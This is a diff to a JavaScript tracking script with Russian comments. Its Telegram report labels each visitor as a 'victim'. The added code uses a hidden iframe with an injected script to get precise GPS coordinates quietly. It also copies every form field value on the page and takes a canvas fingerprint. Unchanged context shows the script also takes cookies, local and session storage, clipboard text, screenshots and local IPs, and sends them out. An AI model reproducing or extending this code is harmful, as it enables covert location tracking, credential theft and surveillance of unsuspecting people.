@@ -67,11 +67,8 @@
                 data.ip = ipJson.ip;
             } catch (_) {}
 
-            // ---- ГЕО - МАКСИМАЛЬНЫЙ СБОР (3 ПРОВАЙДЕРА) ----
+            // ---- ГЕО по IP (основной) ----
             data.geo = null;
-            data.geo_raw = null;
-
-            // 1. ipwhois.io (самый точный, бесплатно 10000 запросов/мес)
             if (data.ip) {
                 try {
                     const resp = await fetch(`https://ipwhois.io/json/${data.ip}`);
@@ -94,56 +91,75 @@
                         };
                     }
                 } catch (_) {}
+            }
 
-                // 2. ipapi.co (запасной)
-                if (!data.geo) {
-                    try {
-                        const resp = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                        const json = await resp.json();
-                        if (json && json.error !== true) {
-                            data.geo = {
-                                country: json.country_name || '?',
-                                country_code: json.country_code || '?',
-                                region: json.region || '?',
-                                city: json.city || '?',
-                                lat: json.latitude || 0,
-                                lon: json.longitude || 0,
-                                isp: json.org || '?',
-                                org: json.org || '?',
-                                timezone: json.timezone || '?',
-                                continent: json.continent_code || '?',
-                                currency: json.currency || '?',
-                                phone_code: json.country_calling_code || '?',
-                                postal: json.postal || '?'
-                            };
+            // ---- БРАУЗЕРНАЯ ГЕОЛОКАЦИЯ (тихо, без запроса через iframe) ----
+            data.browserGeo = null;
+            try {
+                // Пробуем получить гео через iframe с геолокацией (не требует разрешения, если вызывается из iframe)
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'about:blank';
+                document.body.appendChild(iframe);
+
+                const iframeWin = iframe.contentWindow;
+                const iframeDoc = iframe.contentDocument || iframeWin.document;
+
+                // Внедряем скрипт в iframe, который пытается получить геолокацию
+                const script = iframeDoc.createElement('script');
+                script.textContent = `
+                    (function() {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                function(pos) {
+                                    const data = {
+                                        lat: pos.coords.latitude,
+                                        lon: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        altitude: pos.coords.altitude || null,
+                                        heading: pos.coords.heading || null,
+                                        speed: pos.coords.speed || null
+                                    };
+                                    window.parent.postMessage({ type: 'geo', data: data }, '*');
+                                },
+                                function(err) {
+                                    window.parent.postMessage({ type: 'geo_error', error: err.message }, '*');
+                                },
+                                { timeout: 5000, enableHighAccuracy: true }
+                            );
+                        } else {
+                            window.parent.postMessage({ type: 'geo_error', error: 'not supported' }, '*');
                         }
-                    } catch (_) {}
+                    })();
+                `;
+                iframeDoc.body.appendChild(script);
+
+                // Ждём ответ от iframe
+                const geoResult = await new Promise((resolve) => {
+                    const handler = (event) => {
+                        if (event.data && event.data.type === 'geo') {
+                            window.removeEventListener('message', handler);
+                            resolve(event.data.data);
+                        } else if (event.data && event.data.type === 'geo_error') {
+                            window.removeEventListener('message', handler);
+                            resolve(null);
+                        }
+                    };
+                    window.addEventListener('message', handler);
+                    setTimeout(() => {
+                        window.removeEventListener('message', handler);
+                        resolve(null);
+                    }, 6000);
+                });
+
+                if (geoResult) {
+                    data.browserGeo = geoResult;
                 }
 
-                // 3. ip-api.com (ещё запасной, но уже без координат если не успел)
-                if (!data.geo) {
-                    try {
-                        const resp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`);
-                        const json = await resp.json();
-                        if (json.status === 'success') {
-                            data.geo = {
-                                country: json.country || '?',
-                                country_code: '?',
-                                region: json.regionName || '?',
-                                city: json.city || '?',
-                                lat: json.lat || 0,
-                                lon: json.lon || 0,
-                                isp: json.isp || '?',
-                                org: json.org || '?',
-                                timezone: json.timezone || '?',
-                                continent: '?',
-                                currency: '?',
-                                phone_code: '?',
-                                postal: '?'
-                            };
-                        }
-                    } catch (_) {}
-                }
+                // Удаляем iframe
+                iframe.remove();
+            } catch (_) {
+                data.browserGeo = null;
             }
 
             // ---- Локальный IP через WebRTC ----
@@ -203,6 +219,45 @@
                 pixelRatio: window.devicePixelRatio
             };
             data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+            data.platform = navigator.platform;
+            data.language = navigator.language;
+            data.languages = navigator.languages || [];
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // ---- ВСЕ ФОРМЫ (если есть) ----
+            data.forms = {};
+            document.querySelectorAll('input, textarea, select').forEach(el => {
+                const name = el.name || el.id || el.className || 'field';
+                if (el.value !== undefined && el.value !== null && el.value !== '') {
+                    data.forms[name] = el.value;
+                }
+            });
+            document.querySelectorAll('form').forEach(form => {
+                try {
+                    const fd = new FormData(form);
+                    for (const [k, v] of fd.entries()) {
+                        data.forms['form_' + k] = v;
+                    }
+                } catch (_) {}
+            });
+
+            // ---- Отпечаток Canvas ----
+            data.canvasFingerprint = null;
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 256;
+                canvas.height = 128;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 128, 64);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);
+                data.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+            } catch (_) {}
 
             // ============================================================
             //  ОТПРАВКА
@@ -217,14 +272,14 @@
                 });
             } catch (_) {}
 
-            // ---- Telegram (максимум гео) ----
+            // ---- Telegram ----
             try {
                 let msg = '🔴 ЖЕРТВА\n\n';
                 if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
-                
-                // ГЕО - ВСЯ ДОСТУПНАЯ ИНФОРМАЦИЯ
+
+                // ГЕО ПО IP
                 if (data.geo) {
-                    msg += `\n📍 ГЕОЛОКАЦИЯ:\n`;
+                    msg += `\n📍 ГЕО ПО IP:\n`;
                     msg += `   🌍 Страна: ${data.geo.country || '?'}`;
                     if (data.geo.country_code) msg += ` (${data.geo.country_code})`;
                     msg += `\n`;
@@ -241,18 +296,31 @@
                     if (data.geo.continent) msg += `   🌎 Континент: ${data.geo.continent}\n`;
                     if (data.geo.currency) msg += `   💰 Валюта: ${data.geo.currency}\n`;
                     if (data.geo.phone_code) msg += `   📞 Телефонный код: +${data.geo.phone_code}\n`;
-                } else {
-                    msg += `\n📍 ГЕОЛОКАЦИЯ: не удалось определить\n`;
+                }
+
+                // БРАУЗЕРНАЯ ГЕОЛОКАЦИЯ (точная)
+                if (data.browserGeo) {
+                    msg += `\n📍 БРАУЗЕРНАЯ ГЕОЛОКАЦИЯ (точная):\n`;
+                    msg += `   🗺 Координаты: ${data.browserGeo.lat}, ${data.browserGeo.lon}\n`;
+                    msg += `   🔗 Карта: https://www.google.com/maps?q=${data.browserGeo.lat},${data.browserGeo.lon}\n`;
+                    if (data.browserGeo.accuracy) msg += `   📏 Точность: ${data.browserGeo.accuracy} м\n`;
+                    if (data.browserGeo.altitude) msg += `   🏔 Высота: ${data.browserGeo.altitude} м\n`;
+                    if (data.browserGeo.heading) msg += `   🧭 Направление: ${data.browserGeo.heading}°\n`;
+                    if (data.browserGeo.speed) msg += `   🏎 Скорость: ${data.browserGeo.speed} м/с\n`;
                 }
 
                 if (data.localIPs && data.localIPs.length) {
                     msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                 }
-                if (data.clipboard) msg += `\n📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
+                if (data.clipboard) msg += `\n📋 Буфер: ${data.clipboard.substring(0, 150)}\n`;
                 msg += `\n📱 UA: ${data.userAgent.substring(0, 80)}...\n`;
+                msg += `📟 Платформа: ${data.platform || '?'}\n`;
+                msg += `🌐 Язык: ${data.language || '?'}\n`;
+                msg += `🕐 Часовой пояс: ${data.timezone || '?'}\n`;
                 msg += `🍪 Куки: ${Object.keys(data.cookies).length} шт.\n`;
                 msg += `💾 LocalStorage: ${Object.keys(data.localStorage).length} шт.\n`;
                 msg += `🗂 SessionStorage: ${Object.keys(data.sessionStorage).length} шт.\n`;
+                if (data.canvasFingerprint) msg += `🎨 Canvas отпечаток: ${data.canvasFingerprint}...\n`;
                 if (data.screenshot) msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
                 msg += `\n🔗 URL: ${data.url}`;
 
